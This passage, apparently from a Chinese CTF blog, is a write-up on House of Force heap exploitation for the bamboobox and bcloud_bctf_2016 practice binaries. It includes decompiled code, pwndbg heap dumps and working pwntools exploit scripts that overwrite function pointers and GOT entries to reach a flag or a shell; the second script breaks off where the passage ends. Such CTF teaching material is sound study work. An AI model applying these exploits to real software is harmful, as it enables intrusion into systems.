__readfsqword(0x28u);  if ( num &gt; 99 )  {    puts(\"the box is full\");  }  else  {    printf(\"Please enter the length of item name:\");    read(0, buf, 8uLL);\t\t\t\t\t\t\t    v2 = atoi(buf);\t\t\t\t\t\t\t\t\t//输入准备输入内容的长度    if ( !v2 )    {      puts(\"invaild length\");      return 0LL;    }    for ( i = 0; i &lt;= 99; ++i )    {      if ( !itemlist[i].content )      {        LODWORD(itemlist[i].size) = v2;        itemlist[i].content = (char *)malloc(v2);        printf(\"Please enter the name of item:\");        itemlist[i].content[(int)read(0, itemlist[i].content, v2)] = 0;        ++num;        return 0LL;      }\t\t\t\t\t\t\t\t\t\t\t\t//根据输入的长度，malloc大小，并填充数据    }  }  return 0LL;}\n首先根据num判断是否堆满了，然后根据堆结构体写入数据\n根据输入的长度，生成一个堆，然后填入数据，不存在溢出\nchange_item\nunsigned __int64 change_item(){  int v1; // [rsp+4h] [rbp-2Ch]  int v2; // [rsp+8h] [rbp-28h]  char buf[16]; // [rsp+10h] [rbp-20h] BYREF  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  if ( num )  {    printf(\"Please enter the index of item:\");    read(0, buf, 8uLL);    v1 = atoi(buf);    if ( itemlist[v1].content )    {      printf(\"Please enter the length of item name:\");      read(0, nptr, 8uLL);      v2 = atoi(nptr);      printf(\"Please enter the new name of the item:\");      itemlist[v1].content[(int)read(0, itemlist[v1].content, v2)] = 0;// //存在堆溢出，输出长度由我们自己决定    }    else    {      puts(\"invaild index\");    }  }  else  {    puts(\"No item in the box\");  }  return __readfsqword(0x28u) ^ v5;}\n又可以往堆中写入内容，这次长度由我们自己决定，存在堆溢出！！！\nremove_item\nunsigned __int64 remove_item(){  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  if ( num )  {    printf(\"Please enter the index of item:\");    read(0, buf, 8uLL);    v1 = atoi(buf);    if ( itemlist[v1].content )    {      free(itemlist[v1].content);      itemlist[v1].content = 0LL;      LODWORD(itemlist[v1].size) = 0;           // free了且将指针置0，不存在UAF      puts(\"remove successful!!\");      --num;    }    else    {      puts(\"invaild index\");    }  }  else  {    puts(\"No item in the box\");  }  return __readfsqword(0x28u) ^ v3;}\nfree(itemlist[v1].content);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tfree(itemlist[index].name);\nitemlist[v1].content = 0LL; \t\t\t\t\t\t\t\t\t-&gt;    \t\t\t\t\t\t\t\titemlist[index].name = 0;\nLODWORD(itemlist[v1].size) = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\titemlist[index].size = 0;\nfree 了 堆块，清空指针，不存在uaf\nmagic\nvoid __noreturn magic(){  int fd; // [rsp+Ch] [rbp-74h]  char buf[104]; // [rsp+10h] [rbp-70h] BYREF  unsigned __int64 v2; // [rsp+78h] [rbp-8h]  v2 = __readfsqword(0x28u);  fd = open(\"./flag\", 0);  read(fd, buf, 0x64uLL);  close(fd);  printf(\"%s\", buf);  exit(0);}\nmagic = 0x400D49\n目标地址，控制程序执行流到magic函数的位置即可get flag\n结构体\n00000000 item            struc ; (sizeof=0x10, mappedto_6)00000000                                         ; XREF: .bss:itemlist/r00000000 size            dq ?00000008 content         dq ?                    ; offset00000010 item            ends00000010\n对应c代码的 item 结构体\npwndbg 动态调试\n堆内存分布\n首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：\n\nchunk0:size=10，content=“aaaaa”\nchunk1:size=20，content=“bbbbb”\n\ngiantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11$ gdb bambooboxGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from bamboobox...(no debugging symbols found)...done.pwndbg&gt; rStarting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox There is a box with magicwhat do you want to do in the box----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:2Please enter the length of item name:10Please enter the name of item:aaaaa----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:2Please enter the length of item name:20Please enter the name of item:bbbbb----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:^CProgram received signal SIGINT, Interrupt.0x00007ffff7b04360 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484\t../sysdeps/unix/syscall-template.S: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────── RAX  0xfffffffffffffe00 RBX  0x0 RCX  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x8 RDI  0x0 RSI  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x0 R8   0x7ffff7fdd700 ◂— 0x7ffff7fdd700 R9   0xc R10  0x0 R11  0x246 R12  0x4007a0 (_start) ◂— xor    ebp, ebp R13  0x7fffffffdd30 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15 RSP  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10] RIP  0x7ffff7b04360 (__read_nocancel+7) ◂— cmp    rax, -0xfff────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────── ► 0x7ffff7b04360 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff   0x7ffff7b04366 &lt;__read_nocancel+13&gt;    jae    read+73 &lt;0x7ffff7b04399&gt;    ↓   0x7ffff7b04399 &lt;read+73&gt;               mov    rcx, qword ptr [rip + 0x2ccad8]   0x7ffff7b043a0 &lt;read+80&gt;               neg    eax   0x7ffff7b043a2 &lt;read+82&gt;               mov    dword ptr fs:[rcx], eax   0x7ffff7b043a5 &lt;read+85&gt;               or     rax, 0xffffffffffffffff   0x7ffff7b043a9 &lt;read+89&gt;               ret        0x7ffff7b043aa                         nop    word ptr [rax + rax]   0x7ffff7b043b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2389], 0 &lt;0x7ffff7dd6740&gt;   0x7ffff7b043b7 &lt;write+7&gt;               jne    write+25 &lt;0x7ffff7b043c9&gt;    ↓   0x7ffff7b043c9 &lt;write+25&gt;              sub    rsp, 8─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────00:0000│ rsp  0x7fffffffdc28 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]01:0008│      0x7fffffffdc30 ◂— 0x200400ee002:0010│      0x7fffffffdc38 —▸ 0x603010 —▸ 0x400896 (hello_message) ◂— push   rbp03:0018│ rsi  0x7fffffffdc40 —▸ 0x7fffffff0a32 ◂— 0x004:0020│      0x7fffffffdc48 ◂— 0x2b1241ff949c6b0005:0028│ rbp  0x7fffffffdc50 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r1506:0030│      0x7fffffffdc58 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax07:0038│      0x7fffffffdc60 ◂— 0x0───────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────── ► f 0     7ffff7b04360 __read_nocancel+7   f 1           400e5d main+166   f 2     7ffff7a2d840 __libc_start_main+240Program received signal SIGINTpwndbg&gt; \nok，输入完成，接下来我们查看堆的分布\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x603000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x603020Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x603040Size: 0x21Top chunk | PREV_INUSEAddr: 0x603060Size: 0x20fa1pwndbg&gt; \n堆的内存分布f\npwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x00000000004008b1\t\t\t\t\t#hello_message      #goodbye_message0x603020:\t0x0000000000000000\t0x0000000000000021 #chunk00x603030:\t0x00000a6161616161\t0x00000000000000000x603040:\t0x0000000000000000\t0x0000000000000021 #chunk10x603050:\t0x00000a6262626262\t0x00000000000000000x603060:\t0x0000000000000000\t0x0000000000020fa1 #top_chunk......(省略内容均为空)0x6030e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n全局变量\n.bss:00000000006020C0                 public itemlist.bss:00000000006020C0 ; item itemlist[100].bss:00000000006020C0 itemlist        item 64h dup(&lt;?&gt;)       ; DATA XREF: add_item+A4↑o.bss:0000000000602700                 public num.bss:0000000000602700 ; int num.bss:0000000000602700 num             dd ?                    ; DATA XREF: show_item+8↑r\n\n\nitemlist[] 记录着堆块的指针\n\n\nnum 记录着堆块的数量。\n\n\n查看一下堆指针信息\npwndbg&gt; x/10gx 0x6020c00x6020c0 &lt;itemlist&gt;:\t0x000000000000000a\t0x0000000000603030 #chunk0\t\t\t\t\t\t#struct_size        #struct_content_ptr0x6020d0 &lt;itemlist+16&gt;:\t0x0000000000000014\t0x0000000000603050 #chunk1\t\t\t\t\t\t#struct_size        #struct_content_ptr0x6020e0 &lt;itemlist+32&gt;:\t0x0000000000000000\t0x00000000000000000x6020f0 &lt;itemlist+48&gt;:\t0x0000000000000000\t0x00000000000000000x602100 &lt;itemlist+64&gt;:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; //注意struct_content_ptr指向malloc出来malloc_data的地址\n保存着每一个chunk的 size（输入的大小） 和 chunk地址\n攻击原理及exp\n#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./bamboobox')def cmd(choice):  p.sendlineafter('',str(choice))  def create(size,content):  cmd(2)  p.sendlineafter('item name:',str(size))  p.sendlineafter('item:',content)def edit(index,size,content):  cmd(3)  p.sendlineafter('of item:',str(index))  p.sendlineafter('item name:',str(size))  p.sendlineafter('the item:',content)def delete(index):  cmd(4)  p.sendlineafter('of item:',str(index))def quit():  cmd(5)magic = 0x400d49create(0x30, \"aaaa\")content='a'*0x30+'1'*8+p64(0xffffffffffffffff)edit(0,0x40,content)offset=-0x60-0x10create(offset,'bbbb')create(0x10,p64(magic)*2)quit()p.interactive()\npayload 分析\n我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：\n--------------------------------------------------------------------------修改之前：pwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x00000000004008b1\t\t\t\t\t#hello_message      #goodbye_message--------------------------------------------------------------------------我们所期望的：pwndbg&gt; x/30gx 0x6030000x603000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0x603010:\t0x0000000000400896\t0x0000000000400d49\t\t\t\t\t#hello_message      #magic函数\ndef cmd(choice):  p.sendlineafter('',str(choice))  def create(size,content):  cmd(2)  p.sendlineafter('item name:',str(size))  p.sendlineafter('item:',content)def edit(index,size,content):  cmd(3)  p.sendlineafter('of item:',str(index))  p.sendlineafter('item name:',str(size))  p.sendlineafter('the item:',content)def delete(index):  cmd(4)  p.sendlineafter('of item:',str(index))def quit():  cmd(5)\n首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。\ncreate(0x30, \"aaaa\")\npwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA          0x400000           0x402000 r-xp     2000 0      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x601000           0x602000 r--p     1000 1000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x602000           0x603000 rw-p     1000 2000   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/house-of-force/hitcontraning_lab11/bamboobox          0x603000           0x624000 rw-p    21000 0      [heap]    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0          0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7fdc000     0x7ffff7fdf000 rw-p     3000 0          0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0          0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]\n执行完上面的payload之后堆块的状况如下：\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 #chunk0（malloc(0x30)）0xe80030:\t0x0000000a61616161\t0x00000000000000000xe80040:\t0x0000000000000000\t0x00000000000000000xe80050:\t0x0000000000000000\t0x00000000000000000xe80060:\t0x0000000000000000\t0x0000000000020fa1 #top_chunk0xe80070:\t0x0000000000000000\t0x00000000000000000xe80080:\t0x0000000000000000\t0x00000000000000000xe80090:\t0x0000000000000000\t0x00000000000000000xe800a0:\t0x0000000000000000\t0x00000000000000000xe800b0:\t0x0000000000000000\t0x00000000000000000xe800c0:\t0x0000000000000000\t0x00000000000000000xe800d0:\t0x0000000000000000\t0x00000000000000000xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n然后我们编辑刚才创建的堆块（index0）：\ncontent='a'*0x30+'1'*8+p64(0xffffffffffffffff)edit(0,0x40,content)\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #func_start_malloc_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 #chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffff #top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：\noffset=-0x60-0x10create(offset,'bbbb')\n这个offset怎么来的？\n首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060\n要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。\n如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：\nmalloc_size=0xe80000-0xe80060-0x10=-0x70\n因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000059 #new_top_chunk0xe80010:\t0x0000000000400896\t0x00000000004008b1    \t\t#hello_message      #goodbye_message0xe80020:\t0x0000000000000000\t0x0000000000000041 #chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffa1 #old_top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。\ncreate(0x10,p64(magic)*2)\npwndbg&gt; x/30gx 0xe800000xe80000:\t0x0000000000000000\t0x0000000000000021 #现在已经被控制的chunk0xe80010:\t0x0000000000400d49\t0x0000000000400d49    \t\t#hello_message      #magic0xe80020:\t0x0000000000000000\t0x0000000000000039 #chunk0（malloc(0x30)）0xe80030:\t0x6161616161616161\t0x61616161616161610xe80040:\t0x6161616161616161\t0x61616161616161610xe80050:\t0x6161616161616161\t0x61616161616161610xe80060:\t0x3131313131313131\t0xffffffffffffffa1 #top_chunk0xe80070:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0xe800e0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \ndebug-exp\n➜  ~ cd Desktop/    '5.exit\\n'    '----------------------------\\n'    'Your choice:'[DEBUG] Sent 0x5 bytes:    'bbbb\\n'[DEBUG] Sent 0x2 bytes:    '2\\n'[DEBUG] Received 0x117 bytes:    'invaild choice!!!\\n'    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:Please enter the length of item name:'[DEBUG] Sent 0x3 bytes:    '16\\n'[DEBUG] Received 0x1e bytes:    'Please enter the name of item:'[DEBUG] Sent 0x11 bytes:    00000000  49 0d 40 00  00 00 00 00  49 0d 40 00  00 00 00 00  │I·@·│····│I·@·│····│    00000010  0a                                                  │·│    00000011[DEBUG] Received 0x1d2 bytes:    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:invaild choice!!!\\n'    '----------------------------\\n'    'Bamboobox Menu\\n'    '----------------------------\\n'    '1.show the items in the box\\n'    '2.add a new item\\n'    '3.change the item in the box\\n'    '4.remove the item in the box\\n'    '5.exit\\n'    '----------------------------\\n'    'Your choice:'[DEBUG] Sent 0x2 bytes:    '5\\n'[*] Switching to interactive mode----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:invaild choice!!!----------------------------Bamboobox Menu----------------------------1.show the items in the box2.add a new item3.change the item in the box4.remove the item in the box5.exit----------------------------Your choice:[*] Process './bamboobox' stopped with exit code 0 (pid 29277)[DEBUG] Received 0x15 bytes:    'flag{house_of_force}\\n'flag{house_of_force}[*] Got EOF while reading in interactive$  \n可以看到已经打印出来了 flag\n","categories":["heap"],"tags":["House of 系列"]},{"title":"House of Force2","url":"/2023/04/10/House%20of%20Force2/","content":"House Of Force2\n基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。\n如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。\n然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。\nglibc源码：\n// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;}\n例题\nbcloud_bctf_2016\n\n\n程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk\nadd函数\nint add(){  int result; // eax  int i; // [esp+18h] [ebp-10h]  int v2; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )    ;  if ( i == 10 )    return puts(\"Lack of space. Upgrade your account with just $100 :)\");  puts(\"Input the length of the note content:\");  v2 = choose();  heap_array[i] = malloc(v2 + 4);  if ( !heap_array[i] )    exit(-1);  dword_804B0A0[i] = v2;  puts(\"Input the content:\");  readd(heap_array[i], v2, 10);  printf(\"Create success, the id is %d\\n\", i);  result = i;  dword_804B0E0[i] = 0;  return result;}\nadd函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写\nedit函数\nint edit(){  unsigned int v1; // [esp+14h] [ebp-14h]  int v2; // [esp+18h] [ebp-10h]  int v3; // [esp+1Ch] [ebp-Ch]  puts(\"Input the id:\");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts(\"Invalid ID.\");  v2 = heap_array[v1];  if ( !v2 )    return puts(\"Note has been deleted.\");  v3 = dword_804B0A0[v1];  dword_804B0E0[v1] = 0;  puts(\"Input the new content:\");  readd(v2, v3, 10);  return puts(\"Edit success.\");}\ndelete函数\nint delete(){  unsigned int v1; // [esp+18h] [ebp-10h]  void *index; // [esp+1Ch] [ebp-Ch]  puts(\"Input the id:\");  v1 = choose();  if ( v1 &gt;= 0xA )    return puts(\"Invalid ID.\");  index = heap_array[v1];  if ( !index )    return puts(\"Note has been deleted.\");  heap_array[v1] = 0;  dword_804B0A0[v1] = 0;  free(index);  #UAF  return puts(\"Delete success.\");}\ndelete函数在释放chunk时存在UAF漏洞\n自定义一个read函数\nint __cdecl readd(int a1, int a2, char a3){  char buf; // [esp+1Bh] [ebp-Dh] BYREF  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt; a2; ++i )  {    if ( read(0, &amp;buf, 1u) &lt;= 0 )      exit(-1);    if ( buf == a3 )      break;    *(a1 + i) = buf;  }  *(i + a1) = 0;  return i;}\n三个参数，a1为要输入的地址，a2为输入大小，a3为截止符\n先把前面的一些东西写好\nfrom pwn import *from LibcSearcher import *context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))sh = process('./bcloud_bctf_2016')#sh = remote('node4.buuoj.cn',26937)elf = ELF('./bcloud_bctf_2016')def add(size,content):   sla('&gt;&gt;','1')   sla('note content:',str(size))   sa('content:',content) def edit(index,content):   sla('&gt;&gt;','3')   sla('id:',str(index))   sa('content:',content) def delete(index):   sla('&gt;&gt;','4')   sla('id:',str(index))\n分析：\n程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞\nstrcpy复制结束的标志是’\\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来\nsa('name:','a'*64)ru('a'*64)heap_addr = u32(r(4)) - 0x8lg('heap_addr',heap_addr)dbg()\n\n再看另一个函数\n栈布局\n-0000005C v2 dd ?-00000058 db ? ; undefined-00000057 db ? ; undefined..........-00000016 db ? ; undefined-00000015 db ? ; undefined-00000014 v4 dd ?-00000010 db ? ; undefined-0000000F db ? ; undefined-0000000E db ? ; undefined-0000000D db ? ; undefined\n这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）\nsa('Org:','a'*0x40)sla('Host:',p32(0xFFFFFFFF))top_chunk_addr = heap_addr  + 0x48*3 - 0x8lg('top_chunk_addr',(top_chunk_addr))\n\n之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，\n因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，\noffset = heap_array - （top_chunk_addr +0x8）- 0x8\n\nheap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，\n之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，\nadd(offset,'\\n')\tadd(0x18,'\\n')\n之后编辑chunk_1来修改heap_array数组\nputs_plt = elf.plt['puts']__libc_start_main_got = elf.got['__libc_start_main']free_got = elf.got['free']edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\\x00'*0x8)\n此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）\nedit(1,p32(puts_plt) + b'\\n')\n此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址\ndelete(2)dbg()\nfree（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址\n#本地one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')#buu远程#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]#libc = ELF('../../libc-2.23.so--32')libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']onegadget = one_gadget[3] + libc_base\n再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\\x00”)，获得shell。\ndelete(1)itr()\n\nexp\nfrom pwn import *from LibcSearcher import *context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug#定义gdb调试函数def dbg():        gdb.attach(sh)        pause()#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))sh = process('./bcloud_bctf_2016')#sh = remote('node4.buuoj.cn',26937)elf = ELF('./bcloud_bctf_2016')puts_plt = elf.plt['puts']__libc_start_main_got = elf.got['__libc_start_main']free_got = elf.got['free']heap_array = 0x0804B120 def add(size,content):   sla('&gt;&gt;','1')   sla('note content:',str(size))   sa('content:',content) def edit(index,content):   sla('&gt;&gt;','3')   sla('id:',str(index))   sa('content:',content) def delete(index):   sla('&gt;&gt;','4')   sla('id:',str(index))def main():\tsa('name:','a'*64)\tru('a'*64)\theap_addr = u32(r(4)) \tlg('heap_addr',heap_addr)\t#dbg()\tsa('Org:','a'*0x40)\t#修改top chunk的size为-1（0xFFFFFFFF）\tsla('Host:',p32(0xFFFFFFFF))\ttop_chunk_addr = heap_addr + 0x48*3-0x8\tlg('top_chunk_addr',(top_chunk_addr))\toffset = heap_array - (top_chunk_addr +0x8)- 0x8\tlg('offset',offset)\tadd(offset,'') 